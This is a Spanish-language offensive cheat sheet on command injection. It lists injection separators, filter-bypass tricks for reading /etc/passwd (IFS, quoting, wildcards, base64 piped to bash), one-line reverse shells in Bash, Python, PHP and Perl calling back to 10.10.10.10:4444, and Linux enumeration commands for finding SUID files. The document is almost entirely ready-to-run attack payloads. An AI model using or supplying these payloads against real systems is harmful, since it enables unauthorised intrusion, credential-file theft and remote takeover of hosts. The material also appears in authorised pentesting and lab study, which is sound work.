
### Metodología
1. **Identificar input ejecutado**: Campos que interactúan con sistema (ping, whois, file processing)
2. **Probar inyección básica**: `;whoami`, `|whoami`, `$(whoami)`
3. **Identificar contexto**: Ver qué comando se ejecuta y cómo está estructurado
4. **Bypassear filtros**: Usar encoding, variables, wildcards
5. **Obtener shell**: Establecer reverse shell para control completo

### Inyección básica
```ruby
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)
```


### Bypass de espacios

```ruby
# Con ${IFS} (Internal Field Separator)
cat${IFS}/etc/passwd

# Con tabs
cat%09/etc/passwd

# Con redirección
cat</etc/passwd

# Con brace expansion
{cat,/etc/passwd}
```


### Bypass de filtros de palabras

```ruby
# Concatenación
c''at /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Variables
a=c;b=at;$a$b /etc/passwd

# Encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# Wildcard
/bin/c?t /etc/pass??
```


### Reverse shells comunes

**Visitar**: https://www.revshells.com/

```ruby
# Bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```


### Ejemplos de comandos para enumeración

```ruby
# Información del sistema
uname -a
cat /etc/issue
cat /etc/os-release

# Usuario actual
whoami
id

# Red
ifconfig
ip a
hostname

# Procesos
ps aux
ps -ef

# Archivos SUID
find / -perm -4000 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null
```

